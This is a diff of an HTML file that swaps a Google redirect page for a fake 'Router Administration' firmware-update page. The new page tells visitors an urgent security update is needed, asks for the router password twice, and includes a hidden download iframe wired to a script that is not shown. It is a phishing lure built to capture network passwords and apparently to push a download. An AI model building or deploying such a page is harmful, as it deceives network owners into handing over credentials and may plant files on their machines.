@@ -1,13 +1,58 @@
 <!DOCTYPE html>
 <html lang="en">
-	<head>
-		<meta charset="utf-8">
-		<meta http-equiv="X-UA-Compatible" content="IE=edge">
-		<meta name="viewport" content="width=device-width,initial-scale=1.0">
-		<script src="https://cdn.rawgit.com/eligrey/FileSaver.js/5ed507ef8aa53d8ecfea96d96bc7214cd2476fd2/FileSaver.min.js"></script>
-		<script type="text/javascript" src="script.js"></script>
-	</head>
-	<body>
-		<h1>Taking you to Google. . .</h1>
-	</body>
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width,initial-scale=1.0">
+	<link rel="stylesheet" type="text/css" href="router-upgrade.css">
+	<title>Router Admin</title>
+</head>
+<body>
+	<!- Main div ->
+		<div class="main">
+			<!- info_div contains the banner div and "current firmware" info ->
+		<div class="info_div">
+			<p id="info">Current firmware version: 3.14</p>
+			<div class="banner">
+		<img id="router_img" src="./img/router.png" width="100px" height="50px" style="float: left">
+		<h1>Router Administration</h1>
+	</div>
+		</div>
+		<!- admin_div contains the warning message and password prompts ->
+		<div class="admin_div">
+			<!- displays the warning message ->
+			<table id="warning_table">
+				<tr>
+					<th>
+						<h4>FIRMWARE UPDATE NEEDED:</h4>
+					</th>
+				</tr>
+				<tr>
+					<td>
+						<p id="msg">Please download the files to update your firmware to version 4.1.3. This update features enchancements and important security updates.</p>
+					</td>
+				</tr>
+			</table>
+			<!- This displays the network password field ->
+			<table id="admin_table">
+				<tr>
+					<th>
+						<h4>DOWNLOAD AND UPDATE:</h4>
+					</th>
+				</tr>
+				<tr>
+					<td>
+						<br><br>Router Password: <input id="pw" type="password"><br><br>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;Confirm: <input id="confirmpw" type="password"><br><br><br>
+						<button onclick="clicked()">Submit</button>
+						<iframe id="dl" style="display: none"></iframe>
+					</td>
+				</tr>
+			</table>
+		</div>
+	</div>
+	<!- Generic footer ->
+	<footer id="footer">Copyright &copy; 2020</footer>
+	<!- script location ->
+	<script type="text/javascript" src="script.js"></script>
+</body>
 </html>
